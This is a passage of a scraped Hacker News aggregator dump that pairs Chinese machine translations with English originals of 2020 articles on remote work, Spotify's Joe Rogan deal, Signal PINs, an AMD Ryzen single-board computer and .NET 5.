Builds)可能是出版史上时机最好的一本书。艾伦一直在为企业提供如何安全返回的建议。即使各州允许企业开放，这些企业也可能比他们当选的官员更加谨慎。“不管政府怎么说，现在我们仍然处在一个‘在家工作’是有能力的工人优先考虑的地方。这是最好的缓解危险的方法，“艾伦告诉我。“公司需要弄清楚如何将人们安全带回家，这是显而易见的。但这不同于当时的情况。“\n那时候不是今天，数百万在家里工作的美国人应该呆在原地不动。\n当孩子们还一直呆在家里的时候，说要重返工作岗位似乎是无稽之谈。如果在六周内，学校告诉上班的父母，他们必须多呆几个月陪孩子，为什么雇主要投资对工作场所进行精心改造？等待似乎是谨慎的，特别是考虑到还没有几个主要学区宣布他们的秋季计划。学校被证明是一种重要的基础设施；就像水和电一样，如果教育系统崩溃，其他事情就不会发生。\n公司律师有一套不同的担忧。尽管唐纳德·特朗普(Donald Trump)总统要求美国重新开放，但他的政府未能就如何做到这一点提供明确的指导。如果没有这样的指导，如果雇主让员工在工作或上班途中受到伤害，即使他们是真诚行事，也会面临未知的责任敞口。这就是为什么美国企业界拼命呼吁保护自己免受冠状病毒暴露的责任。但是他们还没有拿到。\n国家的官方健康顾问也建议，如果可能的话，工人们应该呆在家里。上周晚些时候，美国疾病控制和预防中心(Centers For Disease Control And Prevention)向雇主发布了淡化的指导意见，此前有新闻报道称，政府阻止了该机构提供更详细的建议。除了告诉雇主促进更好的卫生和更频繁地对工作场所消毒外，它还敦促他们在可行的情况下鼓励远程工作。\n保险公司很可能会要求这样做。在很大程度上，雇主没有为大流行提供良好的保险，保险公司经常拒绝与冠状病毒相关的索赔。换句话说，雇主将面临更好地缓解风险的财务压力。多么?。那么，保险业本身已经提供了一个解决方案。National最近宣布，出于健康和安全原因，它将采用永久性的混合工作模式，在今年年底前将足迹减少到除四家设施之外的所有设施。\n员工们不会介意的。特朗普声称，“真正的人”叫嚣着要回到工作岗位，恢复家庭监禁之外的生活。但民意调查显示，这些“真人”并不多。对社会疏远措施的支持依然很强烈。盖洛普(Gallup)上个月的一项民意调查显示，大多数在家工作的人希望在危机缓解后继续这样做。与此同时，工作要求他们离开家的员工对这样做表示不安；60%的人担心他们的家人暴露在冠状病毒面前。甚至更高比例的非裔美国人和西班牙裔工人表达了这样的担忧。\n冠状病毒加速了已经在进行的趋势。公司正在想方设法削减办公空间的开支；许多员工渴望更频繁地远程办公。即使假设远程工作确实会影响生产力或员工团结，让员工回来也是为企业文化付出的高昂代价。美国正迅速接近10万人死亡大关。我们不能回到大流行之前的生活。我们必须度过难关--并适应它。而且，就目前而言，这意味着更多的缩放。\n我们想听听您对这篇文章的看法。向编辑提交一封信，或写信给letters@theatlantic.com。\n曾在奥巴马总统任内担任国土安全部助理部长，现任哈佛大学肯尼迪政府学院国土安全项目教研室主任。她是“安全妈妈：保护我们的家园和您的家园的非机密指南”一书的作者。", "note_en": "At least half of the American labor force is working from home, and the question now confronting bosses isn’t when their employees can come back to the office but whether they should do so at all. More than two months into the quarantine, coronavirus testing, contact tracing, and treatment protocols are still works in progress in the United States, and a vaccine is still some time away.\n   Not coincidentally, employers keep pushing back their projected return dates. When offices do return, they may limit themselves—because of state orders or their own concerns about preventing employees from getting sick—to just 25 or 30 percent occupancy. But the quiet part of this dilemma needs to be said out loud now: When should you go back to the office? You shouldn’t .\n Many people in a variety of industries—manufacturing, retail, transportation, health care, and more—cannot work from home, of course. Yet the pandemic has shown just how many companies can function adequately, even successfully, without placing all their employees in the same office. If you run an organization whose employees are more or less getting their work done at home, listen to that little voice in your head. Return to the office now? That’s crazy talk. I’m only telling you what you already know.\n    Going to the office has a few advantages: ergonomic furniture, mental separation between work and the rest of life, a daily motivation to dress like an adult and get out of the house. But the main point of going to the office is that all of your co-workers are there too.\n  Yet any return to work before a vaccine is available will have employees distanced, possibly masked. Many offices will operate with reduced occupancy. The places where people normally gather—conference rooms, the break room, the watercooler—may be off-limits. The corporate culture that so many employers prize is based on a level of interaction that will not be regained simply by being in the same building, let alone being in the same building with only a fraction of the workforce present. Until a coronavirus vaccine becomes available, corporate culture is over.\n Sure, office planners can certainly envision a new workplace: new cubicle designs, touchless elevator buttons, ventilation-system upgrades to ensure fresh air, rigorous cleaning protocols, schedule shifting, and the closure of common spaces. Employers are looking to invest in  their own testing systems—something the federal government has been unable or unwilling to set up—and may require temperature checks for all employees. It all sounds so grim, time-consuming, and expensive. If your morning routine wasn’t long enough already, you’ll love waiting in socially distanced lines to get your forehead scanned.\n   Some employers—including Google and Facebook—have already extended work-from-home policies into late fall or early next year. That buys them time for governmental testing and tracing efforts to improve and for better treatments to become available. Twitter went a step further and is now allowing employees to work from home “forever.” That’s a long time. And lest anyone think liberal West Coast tech companies are the only ones making these moves, Fox News has  extended its own work-from-home directive until June 15.\n The Harvard public-health professor Joseph G. Allen—whose new book,  Healthy Buildings, co-authored with the Harvard Business School professor John D. Macomber, may be one of the best timed in publishing history—has been advising companies on how they can return safely. Even if states allow businesses to be open, those businesses may be more cautious than their elected officials are. “Regardless of what governments say, right now we are still in a place where ‘work from home’ is the priority for workers that can. It’s the best hazard mitigation,” Allen told me. “That companies need to figure out how to bring people back safely is obvious. But that is different from the when.”\n  That  when is not today, and the millions of Americans working from home should stay put.\n    Talk of returning to work seems like idle banter while children are still at home  all the time. Why should employers invest in elaborate modifications to a workplace if, in six weeks, schools tell working parents that they have to stay home with their kids for many more months? Waiting seems prudent, especially considering that few major districts have announced their fall plans yet. Schools turn out to be a form of crucial infrastructure; as with water and electricity, if the education system is down, not much else can happen.\n Corporate lawyers have a different set of concerns. Even as President Donald Trump demands that the nation reopen, his administration is failing to provide clear guidance on how to do so. Without such guidance, employers face unknown liability exposure, even when they are acting in good faith, if they expose employees to harm at or en route to work. This is why corporate America is desperately clamoring for protection against liability for coronavirus exposure. But they don’t have it yet.\n  The nation’s official health advisers also recommend that workers remain at home, if possible. The Centers for Disease Control and Prevention released watered-down guidance to employers late last week, after news reports suggested that the administration had blocked more detailed advice from the agency. Beyond telling employers to promote better hygiene and disinfect workspaces more often, it also urged them to encourage telework when feasible.\n Insurers may well demand it. For the most part, employers are not well insured for a pandemic, and insurers are frequently denying coronavirus-related claims. Employers, in other words, will face financial pressure to better mitigate the risk. How? Well, one solution has been provided by the insurance industry itself. Nationwide  announced recently that it would adopt a permanent hybrid work model, reducing its footprint to all but four facilities by the end of the year, for health and safety reasons.\n Employees do not mind. Trump has claimed that “real people” are clamoring to get back to work and resume their lives outside of home confinement. But polls suggest that those “real people” do not exist in significant numbers. Support for social-distancing measures remains strong. A  Gallup poll last month showed that most people who are working from home want to keep doing so after the crisis abates. Meanwhile, employees whose jobs require them to leave home  express trepidation about doing so; 60 percent feared exposing their families to COVID-19. Even higher percentages of African American and Hispanic workers voiced such concerns.\n  The coronavirus has accelerated trends that were already under way. Companies were looking for ways to cut their spending on office space; many workers were eager to telecommute more often. Even assuming that remote work does put a dent in productivity or employee unity, bringing employees back is a high price to pay for corporate culture. The U.S. is fast approaching the 100,000-dead mark. We can’t go back to life before the pandemic. We have to get through it—and adapt. And, for the time being, that means more Zoom.\n  We want to hear what you think about this article.  Submit a letter to the editor or write to letters@theatlantic.com.\n         , a former assistant secretary for homeland security under President Obama, is the faculty chair of the homeland security program at Harvard’s Kennedy School of Government. She is the author of  Security Mom: An Unclassified Guide to Protecting Our Homeland and Your Home.", "posttime": "2020-05-20 05:02:39", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "回到,office", "title": "永远不要回到办公室", "title_en": "Never Go Back to the Office", "transed": 1, "url": "https://www.theatlantic.com/ideas/archive/2020/05/never-go-back-office/611830/", "via": "", "real_tags": ["回到", "office"]}, {"category": "", "categoryclass": "", "imagename": "3a4c4fc2a6f9ae2a11541a9635c6e3ba.png", "infoid": 1002875, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在过去的几年里，Spotify通过挥金如土的方式展示了对播客格式的长期承诺。这家音乐流媒体服务公司已经进行了许多高调的收购，包括制作公司Gimlet和编辑工具Anchor，但今天的新闻很可能是所有收购中最大的一条。\n该公司已经签署了乔·罗根体验(Joe Rogan Experience)的独家多年许可协议。该节目将于9月1日在Spotify上线，并在今年晚些时候成为该平台的独家节目。罗根可以说是媒体中最大、最有影响力的声音。\n该播客主导了苹果的播客排行榜和YouTube点击量。罗根目前在YouTube上有841万订户，他的视频经常获得100多万的点击量。最近对埃隆·马斯克的一次采访已经产生了超过1300万的点击量。截至撰写本文时，该剧目前在苹果排行榜上排名第二，由该服务前十大剧集中的三集组成。据该服务称：“长期以来，这部脱口秀节目一直是Spotify上搜索量最高的播客。”\n在新闻稿附带的音频信息中，罗根指出，“这将是完全相同的节目。我不会成为Spotify的员工。“。这是一个关键点，不仅是为了安抚狂热的粉丝基础，也是因为左翼人士经常批评罗根的节目和信息。该节目经常以右翼声音为特色，包括所谓的知识黑暗网络的成员，骄傲男孩的创始人加文·麦金尼斯和去平台的阴谋人贩子亚历克斯·琼斯。\n其他备受瞩目的嘉宾包括最近再次出现在该节目中的埃隆·马斯克(Elon Musk)和参议员伯尼·桑德斯(Bernie Sanders)。桑德斯的竞选活动在宣传罗根随意获得的总统提名后受到了民主党全国委员会建制派的批评。当时，人权运动称桑德斯“必须重新考虑”这一背书，并称罗根“利用每一个机会攻击了变性人、男同性恋者、女性、有色人种和无数边缘化群体”。\n除了收购现有的节目和播客制作公司外，Spotify还一直在创建自己的内部节目，以从长期领先的苹果手中夺取媒体的主导地位。这次收购代表着一个相当大的机会，因为铁杆粉丝很快就没有其他(合法的)收听节目的选择了。交易的细节-包括期限-尚未披露。\n更新：当被问及罗根电视剧历史上有争议的嘉宾和主题时，该公司的一位发言人简单地回答说，“Spotify上的所有节目都受到我们的内容政策的约束。”", "note_en": "Over the past couple of years, Spotify has demonstrating a long-term commitment to the podcasting format by shelling out money hand over fist. The music streaming service has made a number of high profile acquisitions, including production company Gimlet and editing tool Anchor, but today’s news may well be the biggest of all.\n The company has signed The Joe Rogan Experience to  an exclusive multi-year licensing deal. The show will hit Spotify September 1, and become exclusive to the platform later in the year. Rogan is arguably the biggest and most influential voice in the medium.\n The podcast has dominated Apple’s podcasting charts and YouTube views. Rogan currently has 8.41 million subscribers on YouTube, where his videos regularly rack up more than a million views. A recent interview with Elon Musk has already generated more than 13 million views. As of this writing, the show is currently #2 on Apple’s charts and comprises three of the service’s top ten episodes. “The talk series has long been the most-searched-for podcast on Spotify,” according to the service.\n  In an audio message attached to the release, Rogan noted that, “It will be the exact same show. I will not be an employee of Spotify.” It’s a key point, not just in order to ease the minds of a rabid fanbase, but because the left has often been critical of Rogan’s show and message. The program has often featured right-wing voices, including members of the so-called Intellectual Dark Web, Proud Boy founder Gavin McInnes and de-platformed conspiracy trafficker Alex Jones.\n Other high-profile guests include Elon Musk, who recently made another appearance on the program and Senator Bernie Sanders. Sanders’ campaign came under criticism from the DNC establishment after promoting Rogan’s offhanded nomination for president. At the time, the Human Rights Campaign  said Sanders “must reconsider” the endorsement, stating that Rogan has “attacked transgender people, gay men, women, people of color and countless marginalized groups at every opportunity.”\n  In addition to purchasing existing shows and podcast production companies, Spotify has also been creating its own in-house programs, in a bid to wrest domination of the medium away from long-time leader Apple. This acquisition represents a fairly massive shot across the bow, as diehard fans will soon have no other (legal) option for listening to the show. Details of the deal — including the duration — have not yet been disclosed.\n Update: In response to a question the Rogan show’s history of controversial guests and subject matter, a spokesperson for the company simply responded, “All shows on Spotify are subject to our  content policies.”", "posttime": "2020-05-20 04:46:49", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "协议,signs,罗根", "title": "Spotify签署了一份为期多年的独家协议，名为“乔·罗根体验”(The Joe Rogan Experience)", "title_en": "Spotify signs ‘The Joe Rogan Experience’ to an exclusive multi-year deal", "transed": 1, "url": "https://techcrunch.com/2020/05/19/spotify-signs-the-joe-rogan-experience-to-an-exclusive-multi-year-deal/", "via": "", "real_tags": ["协议", "signs", "罗根"]}, {"category": "", "categoryclass": "", "imagename": "f057d335e11fc2a0bd2c09b880196a3d.png", "infoid": 1002874, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "在Signal，我们的目标是建立一种可靠、安全、私密的通信体验，而且访问范围广、使用简单。从一开始，我们就设计了Signal，使您的信息掌握在您手中，而不是我们手中。目前，这也恰好意味着，如果你的手不小心把手机丢到马桶上，你的信号信息也会随之丢失。这可能比你最初考虑的信息更多。我们认为私人通信不仅仅意味着加密消息，我们也相应地设计了信号。Signal提供私人群组、私人联系人发现、私人配置文件等，所有这些都完全掌握在您手中。随着我们开始支持Signal社区要求的额外功能，比如不基于电话号码的寻址，以及与没有保存在地址簿中的联系人聊天，这意味着越来越多的重要支持数据也可能丢失。其他应用程序和平台-即使它们支持某种形式的加密消息-将这种数据以明文形式存储在服务器上，这样当你丢失或更换手机时，这些信息不会随之丢失。不过，这不利于您的隐私，所以我们采取了一种不同的方法，不会牺牲您对Signal期望的隐私和安全性。在我们最新版本的应用程序中，我们引入了信号个人识别码(Signal PIN)。信号PIN基于我们在12月份预览的安全价值恢复，以便在您丢失或交换设备时能够安全地恢复支持数据，如您的个人资料、设置和您已阻止的人。PIN还将有助于实现新功能，如寻址不完全基于电话号码，因为系统地址簿将不再是维护联系人网络的可行方式。信号PIN至少为4位，但也可以更长或由字母数字组成(如果您愿意)。因为Signal无法访问你的钥匙或数据-如果你忘记了，你的PIN就无法找回，所以我们的应用程序通过定期提醒帮助你记住你的PIN。别担心，随着时间的推移，这些提醒会变得越来越少。我们很高兴将信号PIN送到您的手中，因为我们认为这项技术将帮助我们提供许多新的、有用的和改进的功能，同时保持强大的隐私和安全性。", "note_en": "At Signal, our goal is to build a reliable, secure, and private communication experience that is broadly accessible and simple to use. From the beginning, we’ve designed Signal so that your information is in your hands rather than ours. Currently, that also happens to mean that if your hands accidentally lose your phone to the toilet, your information in Signal is lost along with it. That could be more information than you’d initially consider. We think private communication means much more than just encrypted messaging, and we’ve designed Signal accordingly. Signal provides  private groups,  private contact discovery,  private profiles, etc. All things that are exclusively in your hands. As we move to support additional features the Signal community has asked for – like addressing that isn’t based on phone numbers and chatting with contacts that aren’t saved in an address book – it means that more and more of this important supporting data can also be lost. Other apps and platforms – even if they support some form of encrypted messaging – store this kind of data in plaintext on their servers, so that when you lose or switch phones this information isn’t lost along with it. That’s not good for your privacy, though, so we took a different approach that doesn’t sacrifice the privacy and security you expect from Signal. In the latest version of our apps, we’re introducing Signal PINs. Signal PINs are based on  Secure Value Recovery, which we previewed in December, to allow supporting data like your profile, settings, and who you’ve blocked to be securely recovered should you lose or switch devices. PINs will also help facilitate new features like addressing that isn’t based exclusively on phone numbers, since the system address book will no longer be a viable way to maintain your network of contacts. Signal PINs are at least 4 digits, but they can also be longer or alphanumeric if you prefer. Because Signal doesn’t have access to your keys – or your data – your PIN isn’t recoverable if you forget it, so our apps help you remember your PIN with periodic reminders. Don’t worry, these reminders get less frequent over time. We’re excited to get Signal PINs in your hands, as we think this technology will help us deliver a number of new, useful, and improved features while maintaining strong privacy and security.", "posttime": "2020-05-20 04:46:26", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "信号,signal", "title": "信号PIN", "title_en": "Signal PINs", "transed": 1, "url": "https://signal.org/blog/signal-pins/", "via": "", "real_tags": ["信号", "signal"]}, {"category": "", "categoryclass": "", "imagename": "4b342c9747d30dcccbb67d4adbb4f041.jpg", "infoid": 1002873, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": "Axiomtek本月发布了一款新的嵌入式单板计算机(SBC)，名为CAPA13R。凭借其紧凑的外形因素，该董事会适合与树莓PI竞争，并使用一个关键的秘密武器：AMD Ryzen APU。\n凭借嵌入式AMD Ryzen V1807B或Ryzen V1605B APU，CAPA13R可提供集成显卡，使其成为3D渲染和视频录制等图形密集型应用的理想之选。有了Ryzen V1807B，制造商可以使用AMD的Radeon Vega 11显卡，而Ryzen V1605B则配备了较小的Radeon Vega 8显卡。\nRyzen APU还使用一个DDR4 SO-DIMM为CAPA13R提供高达16 GB的RAM支持。\nCAPA13R SBC宽3.5英寸，与Raspberry Pi的外形相当。默认情况下，它支持以太网，但您可以升级设备以支持使用正确的适配器进行无线连接。\nCAPA13R有两个M.2插槽：一个M.2密钥E和一个M.2密钥B。您可以将E插槽用于无线模块，而B插槽是为存储卡保留的。\nCAPA13R在显示输出方面也有几个选项，有两个HDMI端口、一个DisplayPort和一个LVDS接口。该设备需要12V电源。有关更多规格信息，请查看Axiomtek提供的此数据表[PDF]。", "note_en": "Axiomtek announced a new embedded single-board computer (SBC) this month known as the CAPA13R. With its compact form factor, the board is fit to compete against the  Raspberry Pi and does so with a key secret weapon: an AMD Ryzen  APU.\n With an embedded AMD Ryzen V1807B or Ryzen V1605B APU, the CAPA13R offers integrated graphics, making it ideal for more graphically intense applications, like 3D rendering and video recording. With the Ryzen V1807B, makers are getting access to AMD&#39;s Radeon Vega 11 graphics, while the Ryzen V1605B comes with the lesser Radeon Vega 8 graphics.\n  The Ryzen APUs also give the CAPA13R support for up to 16GB of RAM using one DDR4 SO-DIMM.\n The CAPA13R SBC measures 3.5 inches across, which is comparable to the form factor of the Raspberry Pi. It has Ethernet support by default, but you can upgrade the device to support wireless connectivity with the right adapter.\n   The CAPA13R has two  M.2 slots: one M.2 Key E and one M.2 Key B. You can use the E slot for a wireless module, while the B slot is reserved for storage cards.\n The CAPA13R has a few options when it comes to display output as well, with two HDMI ports, one DisplayPort and one LVDS interface. The unit requires a 12V  power supply. For more spec information, check out this data sheet [ PDF] from Axiomtek.", "posttime": "2020-05-20 04:45:48", "source_domain": "news.ycombinator.com", "source_name": "Hacker News", "tags": "raspberry-pi,ryzen,capa13r", "title": "AMD Ryzen驱动的树莓PI竞争对手使用Radeon Vega Graphics", "title_en": "AMD Ryzen-Powered Raspberry Pi Rival Uses Radeon Vega Graphics", "transed": 1, "url": "https://www.tomshardware.com/news/axiomtek-capa13r-amd-ryzen-radeon-vega-raspberry-pi", "via": "", "real_tags": ["ryzen", "capa13r"]}, {"category": "", "categoryclass": "", "imagename": "da5ce54975b4ade755e4f2d28e3cdfd4.png", "infoid": 1002872, "ip": "", "isanchordig": 1, "ischecked": 1, "isdelete": 0, "isneo": 1, "mark": "", "name": "", "note": ".NET 5是.NET的下一个版本和未来。我们正在继续统一.NET平台的旅程，用一个单一的框架从云扩展到桌面，再扩展到移动设备，甚至更远的地方。回过头来看，我们充分利用了.NET Framework的优点，并将其放入.NET Core3中，包括对WPF和Windows窗体的支持。随着旅程的继续，我们将移动Xamarin和.NET Web程序集以使用.NET5库，并扩展DotNet工具以在浏览器中定位移动和Web程序集。同时，我们将继续改进.NET作为领先的云和容器运行时的功能。\n您可以收听Scott Hanselman和我在今天的“.NET之旅”演讲中谈论.NET5及以后的内容。\n我们想听到你的消息！在https://aka.ms/dotnet5_feedback_blog.上分享您对.NET 5的反馈。我们非常重视您的反馈，并将其用于帮助制定.NET的未来决策。\n去年，我们制定了一个.NET和.NET5的愿景，我们说我们将采用.NET Core和Mono/Xamarin实现，并将它们统一到一个基类库(BCL)和工具链(SDK)中。在全球卫生大流行之后，我们必须适应客户不断变化的需求，并提供必要的支持，以帮助他们顺利运营。我们的努力继续立足于帮助我们的客户解决他们最迫切的需求。因此，我们预计这些功能将在2020年11月发布预览版，但统一将在我们的长期支持(LTS)版本.NET6中真正完成。我们的愿景没有改变，但是我们的时间表改变了。\n我们仍然致力于一个.NET平台，并将在今年11月发布一个高质量的.NET5版本。在通往一个.NET的旅程中，您将继续看到随着多个预览版的出现而出现的创新浪潮。\nASP.NET Core和EF Core也将于今天发布。PowerShell今天发布了一个基于.NET5的版本(POST将在今天晚些时候发布)，现在正在按.NET计划发布。\n您需要Visual Studio 2019 16.6或更高版本才能使用.NET 5.0。要将.NET 5.0与Visual Studio代码配合使用，请安装最新版本的C#扩展。Visual Studio for Mac尚不支持.NET 5.0。\n让我们来看看我们预计在11月份与.NET5一起发布的一些亮点。预览版4中包含了这些更改中的许多部分或全部。这些亮点将更清晰地描述当您采用.NET 5时，您将在开发过程和生产中获得的改进。\n一致的性能：我们更加关注可预测的一致性能，减少性能悬崖和异常值，重点放在P95+延迟上。改进分层JIT编译使用的调用计数机制，以平滑启动期间的性能。\n单文件应用程序-一种新的单文件发布类型，它从单个二进制文件中执行您的应用程序(例如，可以在只读介质上使用)。\nWindows ARM64-使.NET能够在Windows ARM64上本地运行，支持在客户计算机上开发和部署客户端应用程序。\n容器-减小容器映像大小并实现新的容器API，以使.NET能够保持最新的容器运行时演变。\n我将分享一些关于这些改进的更详细的信息，以及我们看到它们的发展方向。\n我们正在使用.NET5.0更改用于目标框架的方法。以下两个项目文件示例通过指定各自的目标框架名字对象(TFM)来演示如何使用.NET Core3.1和.NET5.0目标框架。您可以看到一个新的、更紧凑的.NET5.0 TFM：\n我们正在对.NET5.0的.NETtfms进行几个重要的更改，以简化它们的使用，减少概念，并使其更容易公开特定于操作系统的API。\n随着.NET的发展，以API版本为目标将变得更加简单。我们不会有两个TFM系列，比如：netcoreapp3.1和netStandard2.0。相反，我们只有一个，比如：net5.0和net6.0。这是因为未来只有一个.NET实现，因此不再需要.NET标准(它使多个.NET产品的库兼容)。您还可以瞄准操作系统API，对TFM做一个小小的扩展，比如net5.0-windows和net6.0-android。我们还将从新的项目文件中删除不同的SDK，例如Sdk=&#34；Microsoft.NET.Sdk.WindowsDesktop&#34；，因为Net5.0-WINDOWS将提供相同的信息。最大的好处是，通过以net5.0为目标，您可以100%访问跨平台API，而不是碰巧在.NET标准中的子集。使用哪种TFM总是显而易见的(它要么是可移植的代码，要么是特定于操作系统的)，而且您永远不需要等待Span&lt；T&gt；这样的API出现。\n.NET 6.0将使用与net6.0相同的方法，并将添加net6.0-iOS和net6.0-android。\n这些变化是因为我们认为.NET Core是.NET的未来，我们已经从产品的各个方面去掉了“Core”这个名字，包括API和容器Repos。我们也看到了进一步简化.NET的机会，在.NET 5.0+中去掉了.NET标准这一概念。.NET标准通过与.NET Framework和Xamarin建立桥梁，在建立.NET核心方面发挥了关键作用。NET Standard 2.0版本将保持多年的相关性，如果您需要支持.NET Framework，我们建议您使用它。对于不需要在.NET Framework上运行的应用程序和库，我们建议以net5.0 TFM为目标，这将使您能够访问最大的跨平台API集。对于Xamarin来说，.NET Standard 2.0和2.1仍然是相关的，但是，一旦Xamarin作为.NET 6.0的一部分集成到.NET中，那么它将切换到net6.0 tfms，并且开发人员将专门针对.NET框架兼容性而将.NET Standard 2.0作为目标。\n你可能有更多的问题需要回答。在发布.NET5.0之前，我们将发布一篇关于这个主题的更大的博客文章。以下几点回答了剩下的一些最明显的问题：\n我们不希望创建任何新的网络标准版本。.NET Standard 2.1很可能是最后一个版本。\n现在还没有net5.0-Linux TFM的计划，因为我们(目前)还没有公开任何特定于Linux的API。此外，“Linux”不是单一的统一数量，因此不清楚哪些API会在这样的TFM中公开。我们可以公开POSIX标准，但是我们将其命名为net5.0-POSIX，并且它可以在除Linux之外的其他操作系统上工作。不过，我们也没有这方面的计划。\n我们不打算为Web程序集公开TFM，原因与Linux中描述的类似。\n不能将.NET Framework项目中的TargetFrameworkVersion更新为5.0并期望它成为.NET 5.0项目。这是行不通的。相反，您需要将应用程序移植到.NET Core。对于库，您可以移植到.NET Standard或.NET Core。我们不再向.NET Core添加.NET Framework API，因此无需等待将您的应用程序移植到.NET Core。\n新的TFM计划是工作负载项目的基础部分。我们将在.NET5.0中添加对工作负载的最小支持，然后在.NET6.0中实现完整的愿景。\n.NET 5包括C#9。C#9将有许多特性，包括记录、顶级语句、改进的模式匹配等等。下面是第一个预览版中的一些模式匹配改进：\n今天，我们很高兴地宣布，Windows Forms Designer for.NET Core Projects现在可以作为Visual Studio 2019版本16.6的预览版！Visual Studio16.7预览版1中还提供了较新版本的设计器！\n要在Visual Studio中启用设计器，请转到工具&&gt;选项&&gt;环境&&gt;预览功能，然后选择使用.NET核心应用程序的Windows窗体设计器预览选项。\n新的设计器支持所有Windows窗体控件，除了DataGridView和ToolStripContainer(即将推出)。它包括您预期的所有其他设计器功能，包括：拖放、选择、移动和调整大小、控件的剪切/复制/粘贴/删除、与“属性”窗口的集成、事件生成等。数据绑定和对第三方控件的支持很快就会到来。\n.NET应用程序现在可以在Windows ARM64上本地运行。在此之前，我们在.NET Core 3.0中添加了对Linux ARM64的支持。使用.NET 5.0，您可以在Windows ARM64设备上开发Web和UI应用程序，并将您的应用程序交付给拥有Surface Pro X和类似设备的用户。您已经可以在Windows ARM64上运行.NET Core和.NET Framework应用程序，但要通过x86仿真。这是可行的，但是本机ARM64执行的性能要好得多。\n您可以在ARM64上下载并使用.NET5.0SDK和今天的预览版4。目前，仅支持控制台和ASP.NET核心应用程序。请参阅.NET 5.0 ARM64跟踪问题以跟踪进度。\n主分支添加对Windows窗体的支持。这一变化可能会进入预览版5，但预览版6肯定会出现。您可以从DotNet/Installer下载主分支构建。\n目前需要下载并解压ARM64的.zip文件。我们打算在.NET5最终版本中添加ARM64MSI。\n我们一直与PowerShell团队密切合作，在Windows ARM64上验证并启用PowerShell 7.1。该团队推出Windows ARM64“试验性”版本已经有一段时间了，并打算在Windows ARM64上支持PowerShell7.1。Powershell7.1是基于.NET5.0构建的，应该大约在同一时间发布。\n下图演示了在Windows ARM64上运行的Conway‘s Game of Life VB和Windows窗体示例。\n一年多来，我们在改进ARM64性能方面投入了大量资金。我们致力于使ARM64成为具有.NET的高性能平台。平台的可移植性和一致性一直是.NET的显著特点。这包括无论您在哪里使用.NET，都能提供出色的性能。在.NET Core 3.x中，ARM64的功能与x64相当，但缺少一些关键的性能特性和投资。我们在.NET5.0中对ARM64性能进行了第一次重大投资。\n硬件特性是我们在.NET Core3.0中添加的低级性能特性。当时，我们增加了对x64指令和芯片的支持。作为.NET 5.0的一部分，我们正在扩展该功能以支持ARM64。仅仅创建内部函数并不能提高性能。您需要在性能关键型代码中使用它们。我们在.NET5.0的.NET库中广泛利用了ARM64的内部特性。您也可以在自己的代码中做到这一点，尽管您需要熟悉CPU指令才能做到这一点。\n我将用一个类比来解释硬件内部是如何工作的。在很大程度上，开发人员依赖于.NET中内置的类型和API，如String.Split或HttpClient。这些API通常通过P/Invoke功能利用本机操作系统API。P/Invoke支持高性能的本机互操作，并在BCL中为此广泛使用。您可以自己使用相同的功能来调用本机API。硬件内部功能类似，不同之处在于它们不是调用操作系统API，而是使您能够在代码中直接使用CPU指令。它大致相当于.NET版本的C++内部函数。硬件本质最好被认为是CPU硬件加速功能。它们提供了非常实实在在的好处，现在是.NET库性能基础的关键部分，并为您在我们的性能博客文章中读到的许多好处负责。与C++相比，当.NET内部函数被AOT编译成随时可以运行的文件时，内部函数没有运行时性能损失。\n注意：Visual C++编译器具有类似的内部功能。您可以直接将C++与.NET硬件内部功能进行比较，如果您在System.Runtime.Intrinsics.X86.Avx2、x64(AMD64)内部功能列表和英特尔内部功能指南中搜索_mm_i32ather_ep32，就可以看到这一点。你会看到很多相似之处。\n我们在5.0中对ARM64性能进行了第一次重大投资，但将在后续版本中继续这一努力。我们直接与ARM控股的工程师合作，确定产品改进的优先顺序，并设计最充分利用ARMv8 ISA的算法。其中一些改进将增加ARM32的价值，然而，我们并没有将独特的努力应用于ARM32。\n请与我们分享任何与ARM64相关的性能信息，无论是3.1到5.0的显著改进，还是5.0的性能应该会更好。\n我们看到越来越多的大型面向互联网的网站和服务托管在.NET上，虽然有很多合理的关注点放在每秒请求数(RPS)指标上，但我们发现很少有大的网站所有者问我们这个问题，或者要求数百万的RPS。然而，我们听说了很多关于延迟的事情，特别是关于改善P95或P99延迟的问题。通常，为站点配置的机器或核心的数量(以及最大的成本驱动因素)是基于达到特定的P95指标(而不是P50)来选择的。我们认为延迟是真正的“金钱指标”。\n我们在StackOverflow的朋友们在分享他们服务上的数据方面做得很好。他们的一位工程师尼克·克雷弗(Nick Craver)最近分享了他们在迁移到.NET Core后看到的延迟改进：\n问题的中位数页面呈现时间从大约21ms(由于GC的原因，我们最近略有增加)下降到约15ms。\n第95个百分位数从~40ms下降到~30ms(相同的测量)。第99位从~60ms下降到~45ms。\n虽然您可以看到我们在延迟方面取得了很好的进展，但我们远远不满意。在(遥远的)过去，我们构建了服务器GC和后台GC等功能，通过分别利用多核和线程等当然粒度的CPU功能来改善延迟。然而，这些仍然非常重要，我们需要更具创造性，以显著改善向前发展的延迟，至少在与GC相关的方面是这样。我们已经沿着这些路线启动了多个项目。\n固定对象一直是GC性能的长期挑战，特别是因为它们加速(或导致)内存碎片。我们为固定的对象添加了一个新的GC堆。固定对象堆基于这样的假设，即进程中固定的对象非常少，但它们的存在会造成不成比例的性能挑战。将固定的对象(特别是那些由.NET库创建的对象作为实现细节)移动到一个独特的区域是有意义的，从而使世代GC堆只有很少的固定对象，甚至没有固定的对象，因此具有更高的性能。\n最近，我们一直在解决GC中长期存在的“难题”。DotNet/Runtime#2795对GC静态扫描应用了一种新方法，该方法在确定GC堆对象的活跃度时避免了锁争用。dotnet/coreclr#25986使用了一种新的算法，用于在垃圾收集的标记阶段跨核心平衡GC工作，这应该会增加具有大型堆的垃圾收集的吞吐量，从而减少延迟。\n我们认为容器是最重要的云趋势，并且已经在这一模式上投入了大量资金。我们至少以四种不同的方式在.NET软件堆栈的多个级别投资容器。\n一是我们对基本面的投入。声称这些投资的功劳有点奇怪，因为它们也会使非容器工作负载受益。可能并不明显的是，我们收到的影响我们基本面投资的反馈越来越多地来自部署容器化应用程序的开发人员。这些投资偏向集装箱。\n我们正在努力让.NET在容器中表现得更好。去年年底，我们听到了有关.NET 